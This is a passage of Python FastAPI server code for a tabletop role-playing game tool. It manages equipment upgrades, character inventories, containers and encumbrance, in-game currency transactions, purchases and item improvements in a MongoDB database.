        tags = ["phb"]

    return {
        "kind": kind,
        "slot": slot,
        "slots": slots,
        "item_types": item_types,
        "name": name,
        "name_key": key,
        "unique": unique,
        "description": desc_html,
        "description_html": desc_html,
        "modifiers": modifiers,
        "holder_modifiers": holder_mods,
        "item_effects": item_effects,
        "tags": tags,
        "targets": targets or [],
        "exclusive_group": exclusive_group,
        "created_at": datetime.datetime.utcnow().isoformat()+"Z",
    }

@app.get("/upgrades")
def list_upgrades(request: Request, kind: str = "", slot: str = ""):
    require_auth(request)
    col = get_col("upgrades")
    filt = {}
    if kind.strip():
        filt["kind"] = kind.strip().lower()
    if slot.strip():
        filt["slot"] = slot.strip().lower()
    rows = list(col.find(filt, {"_id":0}))
    for row in rows:
        tags = row.get("tags")
        if not tags:
            row["tags"] = ["phb"]
            col.update_one({"id": row.get("id")}, {"$set": {"tags": row["tags"]}})
    rows.sort(key=lambda r: r.get("name","").lower())
    return {"status":"success","upgrades": rows}

@app.post("/upgrades")
def create_upgrade(request: Request, body: dict = Body(...)):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    col = get_col("upgrades")
    doc = _upgrade_from_body(body)
    if role not in ("moderator","admin"):
        pending = _create_pending_submission(username, role, "upgrade", doc)
        return {"status":"pending","submission": pending}
    if col.find_one({"name_key": doc["name_key"], "kind": doc["kind"], "slot": doc.get("slot","")}):
        raise HTTPException(status_code=409, detail="Duplicate upgrade")
    doc["id"] = next_id_str("upgrade", padding=4)
    col.insert_one(dict(doc))
    return {"status":"success","upgrade": {k:v for k,v in doc.items() if k!="_id"}}

@app.put("/upgrades/{uid}")
def update_upgrade(uid: str, request: Request, body: dict = Body(...)):
    require_auth(request, roles=["moderator","admin"])
    col = get_col("upgrades")
    before = col.find_one({"id": uid})
    if not before:
        raise HTTPException(status_code=404, detail="Not found")
    doc = _upgrade_from_body(body)
    if "created_at" in before:
        doc["created_at"] = before.get("created_at")
    if col.find_one({"id": {"$ne": uid}, "name_key": doc["name_key"], "kind": doc["kind"], "slot": doc.get("slot","")}):
        raise HTTPException(status_code=409, detail="Duplicate upgrade")
    doc["updated_at"] = datetime.datetime.utcnow().isoformat()+"Z"
    col.update_one({"id": uid}, {"$set": doc})
    after = col.find_one({"id": uid}, {"_id":0})
    return {"status":"success","upgrade": after}

@app.delete("/upgrades/{uid}")
def delete_upgrade(uid: str, request: Request):
    require_auth(request, roles=["moderator","admin"])
    col = get_col("upgrades")
    res = col.delete_one({"id": uid})
    if res.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Not found")
    return {"status":"success","deleted": uid}

# ---------- Inventories ----------
from fastapi import Body

def _new_container(name: str) -> dict:
    return {
        "id": next_id_str("container", padding=3),
        "name": (name or "Container").strip(),
        "include": True,        # counts into inventory.enc_total?
        "enc_total": 0.0        # running encumbrance stored in this container
    }

# Special bucket to host equipped items directly on the character
SELF_CONTAINER_ID = "self"
SELF_CONTAINER_NAME = "Self"


def _ensure_self_container(containers: list[dict]) -> list[dict]:
    containers = containers or []
    found = next((c for c in containers if c.get("id") == SELF_CONTAINER_ID), None)
    if found:
        found["name"] = found.get("name") or SELF_CONTAINER_NAME
        found["include"] = bool(found.get("include", True))
        found["enc_total"] = float(found.get("enc_total", 0.0))
        found["built_in"] = True
        return containers
    # keep Self first for visibility
    self_c = {
        "id": SELF_CONTAINER_ID,
        "name": SELF_CONTAINER_NAME,
        "include": True,
        "enc_total": 0.0,
        "built_in": True,
    }
    return [self_c, *containers]


def _default_stow_container(containers: list[dict]) -> str:
    for c in containers or []:
        if c.get("id") != SELF_CONTAINER_ID:
            return c.get("id")
    return (containers or [{}])[0].get("id", "")


def _recompute_encumbrance(items: list[dict], containers: list[dict]) -> tuple[list[dict], float]:
    """Recalculate per-container and inventory encumbrance from items."""
    containers = _ensure_self_container(containers or [])
    cont_map = {c["id"]: c for c in containers}
    for c in containers:
        c["enc_total"] = 0.0
    inv_total = 0.0

    for it in items or []:
        enc_val = float(it.get("enc") or 0.0) * int(it.get("quantity") or 1)
        cid = it.get("container_id") or SELF_CONTAINER_ID
        if it.get("equipped") is not False:
            cid = SELF_CONTAINER_ID
        elif cid == SELF_CONTAINER_ID:
            cid = it.get("stowed_container_id") or _default_stow_container(containers)
        dest = cont_map.get(cid) or cont_map.get(SELF_CONTAINER_ID)
        if dest is None and containers:
            dest = containers[0]
        if dest is None:
            continue
        dest["enc_total"] = float(dest.get("enc_total", 0.0)) + enc_val
        if bool(dest.get("include", True)):
            inv_total += enc_val

    return containers, inv_total

@app.post("/inventories")
def create_inventory(request: Request, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    name = (payload.get("name") or "Inventory").strip()
    currencies = payload.get("currencies") or {}
    containers = payload.get("containers") or []
    containers = [_new_container(c.get("name")) for c in containers if isinstance(c, dict)] or [_new_container("Backpack")]
    containers = _ensure_self_container(containers)
    inv = {
        "id": next_id_str("inventory", padding=4),
        "name": name,
        "owner": user,
        "currencies": {k: int(v) for k, v in currencies.items()},
        "containers": containers,
        "items": [],
        "transactions": [],
        "enc_total": 0.0,   # NEW
        "created_at": datetime.datetime.utcnow().isoformat() + "Z",
    }
    db.inventories.insert_one(dict(inv))
    return {"status": "success", "inventory": inv}

@app.get("/inventories")
def list_inventories(request: Request):
    user, role = require_auth(request)
    db = get_db()
    invs = []
    for inv in db.inventories.find({"owner": user}, {"_id":0}):
        containers = _ensure_self_container(inv.get("containers") or [])
        containers, inv_total = _recompute_encumbrance(inv.get("items") or [], containers)
        if containers != (inv.get("containers") or []) or inv.get("enc_total") != inv_total:
            db.inventories.update_one({"id": inv.get("id")}, {"$set": {"containers": containers, "enc_total": inv_total}})
        inv["containers"] = containers
        inv["enc_total"] = inv_total
        invs.append(inv)
    return {"status":"success","inventories": invs}

@app.get("/inventories/{inv_id}")
def read_inventory(request: Request, inv_id: str):
    user, role = _optional_auth(request)
    db = get_db()
    inv = None
    if user:
        inv = db.inventories.find_one({"id": inv_id, "owner": user}, {"_id":0})
    if not inv and _public_character_ref("inventory_id", inv_id):
        inv = db.inventories.find_one({"id": inv_id}, {"_id":0})
    if not inv:
        raise HTTPException(404, "Not found")
    inv, refresh_report = _refresh_inventory_items_from_catalog(inv_id, inv)
    _ensure_upgrade_choice_ids(inv_id, inv, allow_write=bool(user))
    containers = _ensure_self_container(inv.get("containers") or [])
    recomputed_containers, inv_total = _recompute_encumbrance(inv.get("items") or [], containers)
    needs_update = (inv.get("enc_total") != inv_total) or ((inv.get("containers") or []) != recomputed_containers)
    if needs_update:
        db.inventories.update_one({"id": inv_id}, {"$set": {"containers": recomputed_containers, "enc_total": inv_total}})
        inv["enc_total"] = inv_total
        inv["containers"] = recomputed_containers
    else:
        inv["containers"] = recomputed_containers
        inv["enc_total"] = inv_total
    return {"status":"success","inventory": inv, "refresh_report": refresh_report}

@app.post("/inventories/{inv_id}/duplicate")
def duplicate_inventory(request: Request, inv_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user}, {"_id":0})
    if not inv:
        raise HTTPException(404, "Not found")
    name = (payload.get("name") or "").strip()
    base_name = name or (inv.get("name") or "Inventory").strip() or "Inventory"
    now = datetime.datetime.utcnow().isoformat() + "Z"
    dup = {k: v for k, v in inv.items()}
    dup["id"] = next_id_str("inventory", padding=4)
    dup["name"] = base_name
    dup["owner"] = user
    dup["created_at"] = now
    containers = _ensure_self_container(dup.get("containers") or [])
    containers, inv_total = _recompute_encumbrance(dup.get("items") or [], containers)
    dup["containers"] = containers
    dup["enc_total"] = inv_total
    db.inventories.insert_one(dict(dup))
    return {"status": "success", "inventory": dup}

@app.post("/inventories/{inv_id}/containers")
def add_container(request: Request, inv_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")
    containers = _ensure_self_container(inv.get("containers") or [])
    cont = _new_container(payload.get("name"))
    containers.append(cont)
    containers, inv_total = _recompute_encumbrance(inv.get("items") or [], containers)
    db.inventories.update_one({"id": inv_id}, {"$set": {"containers": containers, "enc_total": inv_total}})
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2}


@app.patch("/inventories/{inv_id}/containers/{cid}")
def patch_container(request: Request, inv_id: str, cid: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    containers = _ensure_self_container(inv.get("containers") or [])
    found = next((c for c in containers if c.get("id") == cid), None)
    if not found:
        raise HTTPException(404, "Container not found")

    if "name" in payload and not found.get("built_in"):
        found["name"] = (payload.get("name") or "Container").strip()
    if "include" in payload:
        include_val = bool(payload.get("include"))
        found["include"] = True if found.get("id") == SELF_CONTAINER_ID else include_val

    containers, inv_total = _recompute_encumbrance(inv.get("items") or [], containers)
    db.inventories.update_one({"id": inv_id}, {"$set": {"containers": containers, "enc_total": inv_total}})
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2}


@app.delete("/inventories/{inv_id}/containers/{cid}")
def delete_container(request: Request, inv_id: str, cid: str):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    containers = _ensure_self_container(inv.get("containers") or [])
    target = next((c for c in containers if c.get("id") == cid), None)
    if not target:
        raise HTTPException(404, "Container not found")
    if target.get("built_in"):
        raise HTTPException(400, "Cannot delete this container")

    remaining = [c for c in containers if c.get("id") != cid]
    items = inv.get("items") or []
    non_self = [c for c in remaining if c.get("id") != SELF_CONTAINER_ID]
    if not non_self:
        extra = _new_container("Storage")
        remaining.append(extra)
    fallback = _default_stow_container(remaining)

    for it in items:
        if it.get("container_id") == cid and not it.get("equipped"):
            it["container_id"] = fallback
            it["stowed_container_id"] = it.get("stowed_container_id") or fallback
        if it.get("stowed_container_id") == cid:
            it["stowed_container_id"] = fallback

    remaining, inv_total = _recompute_encumbrance(items, remaining)
    db.inventories.update_one(
        {"id": inv_id, "owner": user},
        {"$set": {"containers": remaining, "items": items, "enc_total": inv_total}}
    )
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2}

@app.post("/inventories/{inv_id}/money/transaction")
def add_transaction(request: Request, inv_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv: raise HTTPException(404, "Not found")
    currency = (payload.get("currency") or "Jelly").strip()
    amount   = int(payload.get("amount") or 0)
    note     = (payload.get("note") or "").strip()
    source   = (payload.get("source") or "manual").strip()
    cur = inv.get("currencies", {})
    cur[currency] = int(cur.get(currency,0)) + amount
    tx = {"ts": datetime.datetime.utcnow().isoformat()+"Z","currency":currency,"amount":amount,"note":note,"source":source}
    db.inventories.update_one({"id":inv_id},
        {"$set":{"currencies": cur}, "$push":{"transactions": tx}})
    return {"status":"success","currencies": cur, "transaction": tx}

def _fetch_catalog_item(kind: str, ref_id: str) -> dict | None:
    db = get_db()
    col = {"weapon":"weapons","equipment":"equipment","tool":"tools","object":"objects"}.get(kind)
    if not col: return None
    return db[col].find_one({"id": ref_id})

def _extract_item_description(src: dict) -> tuple[str | None, str | None]:
    desc_html = src.get("description_html")
    desc = src.get("description") or src.get("desc")
    return desc, desc_html

def _refresh_inventory_items_from_catalog(inv_id: str, inv: dict) -> tuple[dict, dict]:
    items = inv.get("items") or []
    updated = False
    changed = []
    for it in items:
        ref_id = (it.get("ref_id") or "").strip()
        kind = (it.get("kind") or "").strip().lower()
        if not ref_id or not kind:
            continue
        src = _fetch_catalog_item(kind, ref_id)
        if not src:
            continue

        subcat = src.get("category") if kind == "equipment" else None
        eq_slot = src.get("slot") if kind == "equipment" else None
        name = src.get("name") or (subcat == "armor" and f"Armor - {src.get('type')}") or src.get("style") or "Item"
        enc = float(src.get("enc") or 0.0)
        base_price = int(src.get("price") or 0)
        modifiers = src.get("modifiers") or []
        tags = src.get("tags") or []
        desc, desc_html = _extract_item_description(src)
        consumable = bool(src.get("consumable"))
        alchemy_tool = bool(src.get("alchemy_tool"))

        updates = {}
        def set_if_diff(key, val):
            if it.get(key) != val:
                updates[key] = val

        set_if_diff("name", name)
        set_if_diff("subcategory", subcat)
        set_if_diff("equipment_slot", eq_slot)
        set_if_diff("enc", enc)
        set_if_diff("base_price", base_price)
        set_if_diff("modifiers", modifiers)
        set_if_diff("tags", tags)
        set_if_diff("description", desc)
        set_if_diff("description_html", desc_html)
        set_if_diff("consumable", consumable)
        set_if_diff("alchemy_tool", alchemy_tool)
        set_if_diff("is_animarma", bool(src.get("is_animarma")))

        if updates:
            it.update(updates)
            updated = True
            changed.append({
                "item_id": it.get("item_id"),
                "ref_id": ref_id,
                "name": name,
                "fields": sorted(list(updates.keys()))
            })
    if updated:
        get_db().inventories.update_one({"id": inv_id}, {"$set": {"items": items}})
        inv["items"] = items
    return inv, {"count": len(changed), "changed_items": changed}

def _ensure_upgrade_choice_ids(inv_id: str, inv: dict, allow_write: bool) -> bool:
    items = inv.get("items") or []
    updated = False
    for it in items:
        upgrades = it.get("upgrades") or []
        if not isinstance(upgrades, list):
            continue
        for u in upgrades:
            if isinstance(u, dict) and not u.get("choice_id"):
                u["choice_id"] = next_id_str("invupg", padding=6)
                updated = True
    if updated and allow_write:
        get_db().inventories.update_one({"id": inv_id}, {"$set": {"items": items}})
    return updated

def _tags_filter(tags: str) -> dict:
    raw = [t.strip() for t in (tags or "").split(",") if t.strip()]
    if not raw:
        return {}
    regexes = [re.compile(rf"^{re.escape(t)}$", re.IGNORECASE) for t in raw]
    return {"tags": {"$in": regexes}}

def _normalize_tags(val):
    if val is None:
        return None
    if isinstance(val, str):
        return [t.strip() for t in val.split(",") if t.strip()]
    if isinstance(val, list):
        return [str(t).strip() for t in val if str(t).strip()]
    return []

def _now_iso():
    return datetime.datetime.utcnow().isoformat() + "Z"

def _create_pending_submission(submitter: str, role: str, sub_type: str, payload: dict, kind: str | None = None) -> dict:
    doc = {
        "id": next_id_str("pending", padding=5),
        "type": sub_type,
        "kind": kind or "",
        "status": "pending",
        "payload": payload,
        "submitter": submitter,
        "submitter_role": role,
        "created_at": _now_iso(),
        "updated_at": _now_iso(),
    }
    get_col("pending_submissions").insert_one(dict(doc))
    return {k: v for k, v in doc.items() if k != "_id"}

def _ensure_moderator(role: str):
    if role not in ("moderator", "admin"):
        raise HTTPException(status_code=403, detail="Forbidden")

def _validate_upgrades(kind: str, subcat: str | None, quality: str, existing: list[dict], add: list[dict]) -> tuple[list[dict], int, list[dict]]:
    """Validate and compute fees. Returns (new_upgrades_list, total_fee, steps)"""
    exist = existing or []
    add = add or []
    # allowed only for weapon or armor
    allow = (kind == "weapon") or (kind == "equipment" and subcat == "armor")
    if not allow: return (exist, 0, [])
    # unique rules and slots
    slots = _slots_for_quality(quality)
    # current counts per key
    from collections import Counter
    cnt = Counter([u["key"] for u in exist])
    new = exist[:]
    for u in add:
        key = u.get("key")
        table = WEAPON_UPGRADES if kind=="weapon" else ARMOR_UPGRADES
        meta = next((x for x in table if x["key"]==key), None)
        if not meta: continue
        if meta["unique"] and cnt.get(key,0)>=1:  # unique already there
            continue
        new.append({"key": key, "name": meta["name"], "unique": meta["unique"]})
        cnt[key]+=1
        if len(new) >= slots: break
    # fees according to final number
    fee, steps = _upgrade_fee_for_range(len(exist), len(new)-len(exist))
    return (new, fee, steps)

def _normalize_upgrade_target_list(val):
    if isinstance(val, str):
        return [t.strip().lower() for t in val.split(",") if t.strip()]
    if isinstance(val, list):
        return [str(t).strip().lower() for t in val if str(t).strip()]
    return []

def _normalize_upgrade_payload(add_list):
    out = []
    for a in add_list or []:
        if isinstance(a, str):
            text = a.strip()
            target = ""
            for sep in ("|","@",":"):
                if sep in text:
                    text, target = text.split(sep,1)
                    target = target.strip()
                    break
            out.append({"id": text, "target": target})
        elif isinstance(a, dict):
            entry = {"id": str(a.get("id") or a.get("upgrade_id") or a.get("upgrade") or "").strip()}
            if "target" in a:
                entry["target"] = str(a.get("target") or "").strip()
            out.append(entry)
    return [x for x in out if x.get("id")]

def _fetch_upgrade_docs(ids: list[str]) -> list[dict]:
    if not ids:
        return []
    docs = list(get_col("upgrades").find({"id": {"$in": ids}}, {"_id": 0}))
    by_id = {d["id"]: d for d in docs}
    return [by_id[i] for i in ids if i in by_id]

def _prepare_new_upgrades(existing: list[dict], add_payload: list, kind: str, slot: str | None, quality: str) -> tuple[list[dict], int, list[dict]]:
    existing = existing or []
    add_list = _normalize_upgrade_payload(add_payload)
    if not add_list:
        return [], 0, []
    slot = (slot or "").strip().lower()
    docs = _fetch_upgrade_docs([x["id"] for x in add_list])
    by_id = {d["id"]: d for d in docs}
    new_docs = []
    total_fee = 0
    for payload in add_list:
        doc = by_id.get(payload["id"])
        if not doc:
            raise HTTPException(404, f"Upgrade not found: {payload['id']}")
        if doc.get("kind") != kind:
            raise HTTPException(400, "Upgrade kind mismatch")
        if kind == "equipment":
            slot_req = (doc.get("slot") or "").strip().lower()
            if slot_req and slot and slot_req != slot:
                raise HTTPException(400, "Upgrade not allowed for this equipment slot")

        # exclusivity / unique
        if doc.get("unique"):
            if any(x.get("id") == doc["id"] for x in existing+new_docs):
                raise HTTPException(400, "Upgrade already installed (unique)")
        excl = (doc.get("exclusive_group") or "").strip().lower()
        if excl and any((u.get("exclusive_group") or "").strip().lower() == excl for u in existing+new_docs):
            raise HTTPException(400, f"Exclusive upgrade conflict: {excl}")

        # target selection and limit (max 2 per target)
        targets = _normalize_upgrade_target_list(doc.get("targets"))
        chosen_target = (payload.get("target") or "").strip().lower()
        if targets:
            if not chosen_target:
                raise HTTPException(400, f"Upgrade {doc.get('name','Upgrade')} requires a target selection")
            if chosen_target not in targets:
                raise HTTPException(400, f"Invalid target for upgrade {doc.get('name','Upgrade')}")
            cnt = sum(1 for u in existing+new_docs if (u.get("target") or "").strip().lower() == chosen_target)
            if cnt >= 2:
                raise HTTPException(400, f"Target {chosen_target} already has two upgrades applied")
        else:
            chosen_target = ""

        ndoc = {
            "id": doc.get("id"),
            "name": doc.get("name"),
            "unique": bool(doc.get("unique")),
            "slot": doc.get("slot"),
            "kind": doc.get("kind"),
            "exclusive_group": doc.get("exclusive_group") or "",
            "targets": targets,
            "target": chosen_target,
            "modifiers": doc.get("modifiers") or [],
            "choice_id": next_id_str("invupg", padding=6),
        }
        new_docs.append(ndoc)

    slots_limit = _slots_for_quality(quality)
    if slots_limit and (len(existing) + len(new_docs)) > slots_limit:
        raise HTTPException(400, "Upgrade slots exceeded for current quality")
    fee, steps = _upgrade_fee_for_range(len(existing), len(new_docs))
    total_fee += fee
    return new_docs, total_fee, steps

@app.post("/inventories/{inv_id}/purchase")
def purchase_item(request: Request, inv_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Not found")

    kind = (payload.get("kind") or "").strip().lower()
    ref_id = (payload.get("ref_id") or "").strip()
    qty = max(1, int(payload.get("quantity") or 1))
    quality = (payload.get("quality") or "Adequate").strip()  # kept for future-proof; ignored for objects
    container_id = (payload.get("container_id") or None)
    upgrades_req = payload.get("upgrades") or []
    currency = (payload.get("currency") or "Jelly").strip()
    is_equipped = bool(payload.get("equipped", True))

    src = _fetch_catalog_item(kind, ref_id)
    if not src:
        raise HTTPException(404, "Catalog item not found")

    base_price = int(src.get("price") or 0)
    enc = float(src.get("enc") or 0.0)
    subcat = src.get("category") if kind == "equipment" else None
    name = src.get("name") or (subcat == "armor" and f"Armor - {src.get('type')}") or src.get("style") or "Item"
    eq_slot = src.get("slot") if kind == "equipment" else None
    pricing_mode = (payload.get("pricing_mode") or "market").strip().lower()
    raw_price_modifier = payload.get("price_modifier", None)
    raw_custom_price = payload.get("custom_price", None)
    try:
        price_modifier = float(raw_price_modifier)
    except Exception:
        price_modifier = None
    try:
        custom_price = float(raw_custom_price)
    except Exception:
        custom_price = None

    unit_price = base_price
    base_upgrades: list[dict] = []
    add_upgrades: list[dict] = []
    fee = 0
    if kind in ("weapon", "equipment"):
        unit_price = _qprice(base_price, quality)
        # base (pre-installed) upgrades from catalog
        try:
            base_upgrades, _fee0, _steps0 = _prepare_new_upgrades([], src.get("upgrades") or [], kind, eq_slot, quality)
        except HTTPException as e:
            # user visible error
            raise
        add_upgrades, fee, _steps = _prepare_new_upgrades(base_upgrades, upgrades_req, kind, eq_slot, quality)
        unit_price += fee

    if pricing_mode not in ("market", "custom", "take"):
        if custom_price is not None or (price_modifier is not None and price_modifier != 1):
            pricing_mode = "custom"
        else:
            pricing_mode = "market"

    note_tag = "market price"
    if pricing_mode == "take":
        unit_price = 0
        note_tag = "take"
    elif pricing_mode == "custom":
        if custom_price is not None:
            unit_price = max(0, int(round(custom_price)))
            note_tag = "custom price"
        elif price_modifier is not None:
            unit_price = max(0, int(round(unit_price * price_modifier)))
            note_tag = f"{int(round(price_modifier * 100))}%"
        else:
            unit_price = max(0, int(round(unit_price)))
            note_tag = "custom price"
    else:
        unit_price = max(0, int(round(unit_price)))

    total = int(unit_price * qty)

    # money (negative transaction)
    cur = inv.get("currencies", {})
    cur[currency] = int(cur.get(currency, 0)) - total

    containers = _ensure_self_container(inv.get("containers") or [])
    valid_container_ids = {c.get("id") for c in containers}
    if container_id not in valid_container_ids:
        container_id = _default_stow_container(containers)
    stowed_container_id = container_id or _default_stow_container(containers)
    container_id = SELF_CONTAINER_ID if is_equipped else (container_id or SELF_CONTAINER_ID)

    # store item + transaction
    desc, desc_html = _extract_item_description(src)
    item = {
        "item_id": next_id_str("invitem", padding=5),
        "kind": kind,
        "subcategory": subcat,
        "equipment_slot": eq_slot,
        "ref_id": ref_id,
        "name": name,
        "description": desc,
        "description_html": desc_html,
        "quantity": qty,
        "quality": (quality if kind in ("weapon", "equipment") else None),
        "enc": enc,
        "base_price": base_price,
        "paid_unit": unit_price,
        "upgrades": base_upgrades + add_upgrades,
        "container_id": container_id,
        "stowed_container_id": stowed_container_id,
        "modifiers": src.get("modifiers") or [],
        "tags": src.get("tags") or [],
        "equipped": is_equipped,
        "consumable": bool(src.get("consumable")),
        "alchemy_tool": bool(src.get("alchemy_tool")),
        "craftomancies": [],
    }
    tx = {
        "ts": datetime.datetime.utcnow().isoformat() + "Z",
        "currency": currency,
        "amount": -total,
        "note": f"{'Take' if pricing_mode == 'take' else 'Purchase'} {name} x{qty} ({note_tag})",
        "source": "purchase",
        "item_id": item["item_id"]
    }

    items = inv.get("items") or []
    items = items + [item]
    containers, inv_enc_total = _recompute_encumbrance(items, containers)
    db.inventories.update_one({"id": inv_id}, {
        "$set": {"currencies": cur, "containers": containers, "enc_total": inv_enc_total, "items": items},
        "$push": {"transactions": tx}
    })
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2, "transaction": tx}

@app.post("/inventories/{inv_id}/items/{item_id}/improve")
def improve_item(request: Request, inv_id: str, item_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv: raise HTTPException(404, "Not found")
    currency = "Jelly"

    items = inv.get("items", [])
    idx = next((i for i,x in enumerate(items) if x["item_id"]==item_id), -1)
    if idx < 0: raise HTTPException(404, "Item not found")
    it = items[idx]
    kind = it["kind"]; subcat = it.get("subcategory")

    # quality upgrade cost = (newQ - oldQ) diff per unit * qty
    new_q = payload.get("new_quality")
    add_keys = payload.get("add_upgrades") or []

    total_cost = 0
    note_parts = []

    # quality
    if new_q and kind in ("weapon","equipment"):
      old_q = it.get("quality") or "Adequate"
      base = it.get("base_price") or 0
      delta = _qprice(base, new_q) - _qprice(base, old_q)
      if delta < 0: delta = 0  # no refund by default
      total_cost += delta * int(it.get("quantity") or 1)
      it["quality"] = new_q
      note_parts.append(f"quality → {new_q}")

    # upgrades
    existing_upgs = it.get("upgrades") or []
    try:
        add_upgrades, fee, steps = _prepare_new_upgrades(existing_upgs, add_keys, kind, it.get("equipment_slot") or it.get("slot") or None, it.get("quality") or "Adequate")
    except HTTPException:
        raise
    if len(add_upgrades) > 0:
        it["upgrades"] = existing_upgs + add_upgrades
        total_cost += fee
        note_parts.append(f"+{len(add_upgrades)} upgrade(s)")

    # persist + money
    if total_cost > 0:
        cur = inv.get("currencies", {})
        cur[currency] = int(cur.get(currency,0)) - total_cost
        tx = {"ts": datetime.datetime.utcnow().isoformat()+"Z","currency":currency,"amount":-total_cost,"note":f"Improve {it['name']}: "+", ".join(note_parts),"source":"upgrade"}
        items[idx] = it
        db.inventories.update_one({"id": inv_id}, {"$set":{"items": items, "currencies": cur}, "$push":{"transactions": tx}})
    else:
        db.inventories.update_one({"id": inv_id}, {"$set":{"items": items}})

    inv2 = db.inventories.find_one({"id": inv_id}, {"_id":0})
    return {"status":"success","inventory": inv2}

@app.get("/catalog/objects")
def catalog_objects(request: Request, q: str = "", tags: str = "", limit: int = 25):
    require_auth(request)
    col = get_col("objects")
    filt = {}
    if q.strip():
        filt = {"name": {"$regex": re.escape(q.strip()), "$options": "i"}}
    if tags.strip():
        filt.update(_tags_filter(tags))
    rows = list(col.find(filt, {"_id": 0, "id": 1, "name": 1, "price": 1, "enc": 1}).limit(int(limit)))
    return {"status": "success", "objects": rows}

@app.post("/inventories/{inv_id}/deposit")
def deposit_funds(request: Request, inv_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    currency = (payload.get("currency") or _pick_currency(inv)).strip()
    amount = int(payload.get("amount") or 0)
    note = (payload.get("note") or "Deposit").strip()
    if amount == 0:
        raise HTTPException(400, "Amount must be non-zero")

    cur = inv.get("currencies", {})
    cur[currency] = int(cur.get(currency, 0)) + amount

    tx = {
        "ts": datetime.datetime.utcnow().isoformat() + "Z",
        "currency": currency, "amount": amount,
        "note": note, "source": "deposit"
    }
    db.inventories.update_one({"id": inv_id}, {
        "$set": {"currencies": cur},
        "$push": {"transactions": tx}
    })
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2, "transaction": tx}

@app.post("/inventories/{inv_id}/transactions/undo")
def undo_inventory_transaction(request: Request, inv_id: str):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")
    transactions = inv.get("transactions") or []
    if not transactions:
        raise HTTPException(400, "No transactions to undo")
    tx = transactions[-1]
    source = (tx.get("source") or "").strip()
    currency = (tx.get("currency") or _pick_currency(inv)).strip()
    amount = int(tx.get("amount") or 0)
    cur_map = dict(inv.get("currencies") or {})
    set_fields: dict[str, object] = {}
    if source == "deposit":
        if amount <= 0:
            raise HTTPException(400, "Invalid deposit transaction")
        cur_map[currency] = int(cur_map.get(currency, 0)) - amount
        set_fields["currencies"] = cur_map
    elif source == "purchase":
        item_id = tx.get("item_id")
        if not item_id:
            raise HTTPException(400, "Purchase transaction missing item reference")
        items = inv.get("items") or []
        idx = next((i for i, x in enumerate(items) if x.get("item_id") == item_id), -1)
        if idx < 0:
            raise HTTPException(400, "Item already removed")
        items = items[:idx] + items[idx + 1:]
        containers = inv.get("containers") or []
        containers, inv_enc_total = _recompute_encumbrance(items, containers)
        cur_map[currency] = int(cur_map.get(currency, 0)) - amount
        if cur_map[currency] < 0:
            raise HTTPException(400, "Cannot undo purchase: insufficient balance")
        set_fields.update({
            "items": items,
            "containers": containers,
            "enc_total": inv_enc_total,
            "currencies": cur_map
        })
    else:
        raise HTTPException(400, f"Undo not supported for {source or 'unknown'} transactions")
    update_op = {"$pop": {"transactions": 1}}
    if set_fields:
        update_op["$set"] = set_fields
    db.inventories.update_one({"id": inv_id, "owner": user}, update_op)
    inv2 = db.inventories.find_one({"id": inv_id}, {"_id": 0})
    return {"status": "success", "inventory": inv2, "transaction": tx}

@app.patch("/inventories/{inv_id}/items/{item_id}")
def patch_item(request: Request, inv_id: str, item_id: str, payload: dict = Body(...)):
    user, role = require_auth(request)
    db = get_db()
    inv = db.inventories.find_one({"id": inv_id, "owner": user})
    if not inv:
        raise HTTPException(404, "Inventory not found")

    alt_name = payload.get("alt_name", None)
    equipped = payload.get("equipped", None)
    target_container = payload.get("container_id", None)
    consumable = payload.get("consumable", None)
    alchemy_tool = payload.get("alchemy_tool", None)
    linked_nature = payload.get("linked_nature", None)
    if alt_name is None and equipped is None and target_container is None and consumable is None and alchemy_tool is None and linked_nature is None:
        raise HTTPException(400, "Nothing to update")

    containers = _ensure_self_container(inv.get("containers") or [])
    items = inv.get("items") or []
    idx = next((i for i, x in enumerate(items) if x.get("item_id") == item_id), -1)
    if idx < 0:
        raise HTTPException(404, "Item not found")

    it = dict(items[idx])
    if alt_name is not None:
        it["alt_name"] = (alt_name or "").strip()
    if consumable is not None:
        it["consumable"] = bool(consumable)
        if it["consumable"]:
            # consumables should not stay equipped
            it["equipped"] = False
            if it.get("container_id") == SELF_CONTAINER_ID:
                it["container_id"] = it.get("stowed_container_id") or _default_stow_container(containers)
    if alchemy_tool is not None:
        it["alchemy_tool"] = bool(alchemy_tool)
    if linked_nature is not None:
        it["linked_nature"] = (linked_nature or "").strip()

    valid_ids = {c.get("id") for c in containers}
    move_target = None
    if target_container is not None:
        move_target = target_container if target_container in valid_ids else _default_stow_container(containers)
